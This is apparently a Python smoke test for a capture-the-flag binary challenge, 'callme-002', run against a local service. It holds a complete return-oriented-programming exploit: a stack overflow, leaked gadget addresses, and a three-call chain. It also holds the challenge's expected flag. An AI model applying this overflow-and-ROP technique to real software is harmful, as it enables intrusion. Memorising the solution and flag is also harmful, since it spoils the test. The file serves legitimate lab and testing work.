#!/usr/bin/env python3
"""Smoke test for callme-002 (port 9989): the three-helper call-me
sequence, no-PIE.

The overflow rides vuln_copy's memcpy (small[8], 16 bytes to the ret
slot). The banner hands the three helper addresses and the pop3
gadget; the exploit needs NO offline addresses. The chain:

  pop3; 1; 2; 3; helper_one -> "one: OK"
  pop3; 1; 2; 3; helper_two -> "two: OK"
  pop3; 1; 2; 3; helper_three -> "FLAG: ..."

helper_three exits inside the win path, so the echo trail stops at the
flag. The payload carries one trailing filler byte: main() NULs the
last read byte (input[n - 1] = 0), the filler absorbs it.

Success output (exactly):

  one: OK
  two: OK
  FLAG: FLAG{mr5_callme_three_args}
"""

import re
import socket
import struct

HOST = "127.0.0.1"
PORT = 9989

PAD = 16  # small[8] + saved rbp

p64 = lambda x: struct.pack("<Q", x & (2**64 - 1))


def recv_until(s, needle, limit=65536):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # the banner: the four addresses the chain needs
    banner = recv_until(s, b"name? ")
    m = re.search(
        rb"one\(\) at 0x([0-9a-f]+) two\(\) at 0x([0-9a-f]+) "
        rb"three\(\) at 0x([0-9a-f]+) gadget\(\) at 0x([0-9a-f]+)",
        banner,
    )
    assert m, f"no helper addresses in banner: {banner[:120]!r}"
    one, two, three, gadget = (int(m.group(i), 16) for i in range(1, 5))
    print(f"[+] one={one:#x} two={two:#x} three={three:#x} pop3={gadget:#x}")

    # the chain: the pop3 gadget (function + 4: past the push rbp;
    # mov rsp,rbp prologue) sets (1, 2, 3) per helper, three rounds
    chain = b""
    for fn in (one, two, three):
        chain += p64(gadget + 4) + p64(1) + p64(2) + p64(3) + p64(fn)
    payload = b"A" * PAD + chain + b"B"  # the filler absorbs input[n-1]=0
    print(f"[+] payload {len(payload)} bytes")
    s.send(payload)

    out = recv_until(s, b"FLAG:", limit=4096) + s.recv(4096)
    print(f"[+] output: {out.strip()[-80:]!r}")
    assert b"one: OK" in out and b"two: OK" in out, "helper echoes missing"
    assert b"FLAG{mr5_callme_three_args}" in out, "oracle flag missing"
    print("[+] callme-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
